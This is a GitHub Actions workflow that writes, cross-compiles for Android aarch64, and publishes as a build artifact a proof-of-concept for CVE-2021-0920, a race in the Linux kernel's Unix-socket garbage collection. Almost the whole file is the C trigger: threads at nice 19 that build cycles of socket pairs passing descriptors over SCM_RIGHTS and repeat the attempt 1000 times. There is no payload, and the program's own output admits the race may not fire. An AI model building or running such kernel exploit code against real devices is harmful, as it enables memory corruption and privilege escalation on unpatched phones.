name: build_cve_2021_0920_poc_v5_nice
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Android NDK
        uses: nttld/setup-ndk@v1
        id: setup-ndk
        with:
          ndk-version: r27c
          add-to-path: true

      - name: Write PoC source
        run: |
          cat << 'EOF' > poc.c
          #define _GNU_SOURCE
          #include <fcntl.h>
          #include <pthread.h>
          #include <sched.h>
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <sys/resource.h>
          #include <sys/socket.h>
          #include <sys/types.h>
          #include <time.h>
          #include <unistd.h>

          #define NUM_ATTEMPTS 1000

          static int send_fd(int sock, int fd) {
              struct msghdr msg = {0};
              char ctrl[CMSG_SPACE(sizeof(int))];
              memset(ctrl, 0, sizeof(ctrl));
              struct iovec io = { .iov_base = "X", .iov_len = 1 };
              msg.msg_iov = &io;
              msg.msg_iovlen = 1;
              msg.msg_control = ctrl;
              msg.msg_controllen = sizeof(ctrl);
              struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
              cm->cmsg_level = SOL_SOCKET;
              cm->cmsg_type = SCM_RIGHTS;
              cm->cmsg_len = CMSG_LEN(sizeof(int));
              memcpy(CMSG_DATA(cm), &fd, sizeof(int));
              return sendmsg(sock, &msg, 0);
          }

          static void *worker(void *arg) {
              (void)arg;
              int sv[2];
              
              // LOW priority (nice 19) - no CAP_SYS_NICE needed
              setpriority(PRIO_PROCESS, 0, 19);
              sched_yield();
              
              for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
                  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;
                  
                  // Create many cycles (this is the bug trigger)
                  int pairs[32][2];
                  for (int i = 0; i < 32; i++) {
                      if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) break;
                      send_fd(sv[0], pairs[i][0]);
                      send_fd(pairs[i][0], pairs[i][1]);
                      send_fd(pairs[i][1], pairs[i][0]);
                  }
                  
                  close(sv[0]);
                  close(sv[1]);
                  
                  sched_yield();
                  
                  for (int i = 0; i < 32; i++) {
                      close(pairs[i][0]);
                      close(pairs[i][1]);
                  }
                  
                  if (attempt % 100 == 0) {
                      printf("[worker] attempt %d/%d\n", attempt, NUM_ATTEMPTS);
                      fflush(stdout);
                  }
              }
              return NULL;
          }

          int main(void) {
              printf("[*] CVE-2021-0920 PoC v5 (with positive nice)\n");
              printf("[*] Using setpriority(nice=19) - no CAP_SYS_NICE needed\n");
              printf("[*] Running %d attempts\n\n", NUM_ATTEMPTS);
              
              pthread_t workers[4];
              for (int i = 0; i < 4; i++) {
                  pthread_create(&workers[i], NULL, worker, NULL);
              }
              
              for (int i = 0; i < 4; i++) {
                  pthread_join(workers[i], NULL);
              }
              
              printf("\n[*] PoC finished without crash.\n");
              printf("[*] The race did not trigger on this run.\n");
              
              return 0;
          }
          EOF

      - name: Compile
        env:
          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
        run: |
          $ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
            -static -O2 -pthread poc.c -o poc_v5
          ls -la poc_v5

      - uses: actions/upload-artifact@v4
        with:
          name: cve-2021-0920-poc-v5
          path: poc_v5
